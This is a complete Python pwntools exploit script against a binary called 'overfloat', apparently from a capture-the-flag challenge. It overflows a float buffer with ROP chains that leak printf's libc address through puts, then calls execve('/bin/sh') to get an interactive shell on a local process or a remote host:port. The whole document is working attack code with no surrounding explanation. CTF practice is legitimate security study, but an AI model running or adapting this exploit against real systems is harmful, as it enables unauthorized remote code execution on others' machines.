#!/usr/bin/env python3.7
from pwn import *
import struct
import sys

# argument for testing remotely host:port
TEST_LOCALLY = True
if len(sys.argv) > 1:
    TEST_LOCALLY = False
    HOST,PORT = sys.argv[1].split(':')
    PORT = int(PORT)

# NOTE: these might change if the binary changes
# DATA_NULL needs to be the address of qword(0)
DATA_NULL = 0x00602070
MAIN = 0x00400740

# strings in the binary used for delimiting rop output
DELIMITER_ONE_STR = b'GO?'
DELIMITER_TWO_STR = b'done'
END_OF_OUTPUT = b'BON VOYAGE!'
DISTANCE_TO_RIP = 14

# libc function/gadget locations
# found dynamically with pwntools.elf
libc_elf = ELF('libc')
libc_rop = ROP(libc_elf)

POP_RDX_RBX_OFFSET = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret']).address
PRINTF_OFFSET = libc_elf.symbols[b'printf']
EXECVE_OFFSET = libc_elf.symbols[b'execve']
BINSH_OFFSET = next(libc_elf.search('/bin/sh'))

# rop gadgets and other addresses
# found dynamically with pwntools.elf
elf = ELF('dist/overfloat')
rop = ROP(elf)

DELIMITER_ONE = next(elf.search(DELIMITER_ONE_STR))
DELIMITER_TWO = next(elf.search(DELIMITER_TWO_STR))
POP_RSI_R15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
POP_RDI = rop.find_gadget(['pop rdi', 'ret']).address
PRINTF_GOT = elf.symbols[b'got.printf']
PUTS = elf.symbols[b'puts'] 


# the binary will complain if you give it an odd
# number of floats. If all interaction is through
# send_u64 we will never hit this issue, because
# it sends two at a time.
def send_u64(u64):
    """encode an int64 as two floats and send"""
    fs = struct.unpack('<ff', struct.pack('<Q', u64))
    for f in fs:
        r.sendline(str(f))


def leak(addr):
    """sends float encoded rops for
       puts(addr) ; puts(DELIMITER_ONE)
    """
    send_u64(POP_RDI)
    send_u64(addr)
    send_u64(PUTS)
    send_u64(POP_RDI)
    send_u64(DELIMITER_ONE)
    send_u64(PUTS)


if TEST_LOCALLY:
    r = process('dist/overfloat')
else:
    r = remote(HOST, PORT)

# fill up the float buffer
for _ in range(DISTANCE_TO_RIP):
    r.sendline('1')

# SEND ROPS
# 1) leak each byte of reloc.printf
# this could be simplified, but I'm doing
# each byte to avoid null issues
leak(PRINTF_GOT)
leak(PRINTF_GOT+1)
leak(PRINTF_GOT+2)
leak(PRINTF_GOT+3)
leak(PRINTF_GOT+4)
leak(PRINTF_GOT+5)
leak(PRINTF_GOT+6)
leak(PRINTF_GOT+7)

# 2) end output with DELIMITER_TWO
send_u64(POP_RDI)
send_u64(DELIMITER_TWO)
send_u64(PUTS)

# 3) and then go back to main
send_u64(MAIN)

# so finish input
r.sendline('done')
r.recvuntil(END_OF_OUTPUT)
r.recvline()

# now parse rop output
data = r.recvuntil(DELIMITER_TWO_STR + b'\n')
lines = data.split(DELIMITER_ONE_STR + b'\n')
address_bytes = []
for line in lines[:-1]:
    if line == b'\n':
        address_bytes.append(0)
    else:
        address_bytes.append(line[0])
printf = struct.unpack('<Q', bytes(address_bytes))[0]

# now ret to libc execve
# for some reason system and one gadget were breaking :(
libc = printf - PRINTF_OFFSET
pop_rdx_rbx = libc + POP_RDX_RBX_OFFSET
execve = libc + EXECVE_OFFSET
binsh = libc + BINSH_OFFSET

# fill the buffer again
for _ in range(DISTANCE_TO_RIP):
    r.sendline('1')

# rops part 2 - execve("/bin/sh", [], [])
send_u64(POP_RDI)
send_u64(binsh)
send_u64(POP_RSI_R15)
send_u64(DATA_NULL) # rsi
send_u64(0) # r15
send_u64(pop_rdx_rbx)
send_u64(DATA_NULL) # rdx
send_u64(0) # rbx
send_u64(execve)
r.sendline('done')
r.recvuntil(END_OF_OUTPUT)
r.recvline()
r.interactive()
